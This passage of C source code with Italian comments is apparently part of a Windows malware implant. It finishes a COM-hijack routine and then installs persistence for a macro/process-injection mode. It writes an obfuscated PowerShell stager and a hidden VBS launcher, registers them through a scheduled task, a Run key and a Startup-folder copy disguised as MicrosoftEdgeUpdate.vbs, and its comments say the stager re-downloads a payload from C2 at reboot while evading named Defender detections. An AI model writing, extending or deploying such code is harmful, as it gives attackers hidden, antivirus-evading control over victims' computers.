    RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE *)dll_path, cbData);

    const wchar_t *tm = L"Apartment";
    RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ,
                   (const BYTE *)tm, (DWORD)((wcslen(tm)+1)*sizeof(wchar_t)));

    RegCloseKey(hKey);
    _dbg("COM_hijack_ok", S_OK);
    return 1;
}

/* ─── install_persistence_modeD ──────────────────────────────────────────────
 * Persistenza per Mode D (macro XLSM / process injection).
 * Scrive uno stager .ps1 offuscato su disco (no DLL, no -EncodedCommand).
 * Evita: Wacatac.H!ml (DLL su disco) e ClickFix.ZB (-EncodedCommand).
 *
 * L1  Task schedulata (T1053.005)  → powershell -File <stager.ps1>
 *     Fallback: schtasks.exe se COM fallisce
 * L2  Run key        (T1547.001)  → powershell -File <stager.ps1>
 * L3  Startup bat    (T1547.001)  → powershell -File <stager.ps1>
 *
 * Al reboot lo stager .ps1 ri-scarica dal C2 e carica in RAM.
 * MITRE: T1053.005 + T1547.001 + T1059.001                                 */
int install_persistence_modeD(void) {
    _dbg("modeD_vbs_start", S_OK);

    /* 1. Scrive lo stager .ps1 */
    wchar_t *ps1Path = _write_stager_ps1();
    if (!ps1Path) {
        _dbg("modeD_ps1_write_fail", E_FAIL);
        install_run_key();
        install_startup_folder();
        return 0;
    }

    /* 2. Scrive il launcher .vbs (nasconde finestra senza -WindowStyle Hidden) */
    wchar_t *vbsPath = _write_launcher_vbs(ps1Path);
    if (!vbsPath) {
        _dbg("modeD_vbs_write_fail", E_FAIL);
        install_run_key();
        install_startup_folder();
        return 0;
    }

    /* Tutti i layer lanciano wscript.exe //B → .vbs → powershell nascosto.
     * Nessun -WindowStyle Hidden nel command line → niente Commando.A!ml. */

    /* ── L1: Task Scheduler COM → wscript.exe ── */
    wchar_t wszWscript[MAX_PATH] = {0};
    GetSystemDirectoryW(wszWscript, MAX_PATH);
    lstrcatW(wszWscript, L"\\wscript.exe");

    wchar_t wszArgs[MAX_PATH * 2] = {0};
    _snwprintf(wszArgs, MAX_PATH*2-1,
               L"//B //Nologo \"%s\"", vbsPath);

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    int bTaskOk = install_persistence(wszWscript, wszArgs);
    CoUninitialize();

    if (!bTaskOk) {
        _dbg("L1_com_failed", E_FAIL);
    }

    /* ── L2: Run key → wscript.exe //B ── */
    {
        wchar_t runVal[MAX_PATH * 2] = {0};
        _snwprintf(runVal, MAX_PATH*2-1,
            L"wscript.exe //B //Nologo \"%s\"", vbsPath);
        _set_run_key_value(runVal);
        _dbg("L2_runkey_vbs", S_OK);
    }

    /* ── L3: Copia VBS nella Startup folder ── */
    {
        wchar_t startupDir[MAX_PATH] = {0};
        ExpandEnvironmentStringsW(
            L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            startupDir, MAX_PATH);
        wchar_t startupVbs[MAX_PATH] = {0};
        _snwprintf(startupVbs, MAX_PATH - 1,
            L"%s\\MicrosoftEdgeUpdate.vbs", startupDir);

        if (CopyFileW(vbsPath, startupVbs, FALSE)) {
            /* Imposta attributi hidden+system */
            SetFileAttributesW(startupVbs,
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            _dbg("L3_startup_vbs_copy", S_OK);
        }
    }

    _dbg("modeD_vbs_done", bTaskOk ? S_OK : E_FAIL);
    return bTaskOk;
}
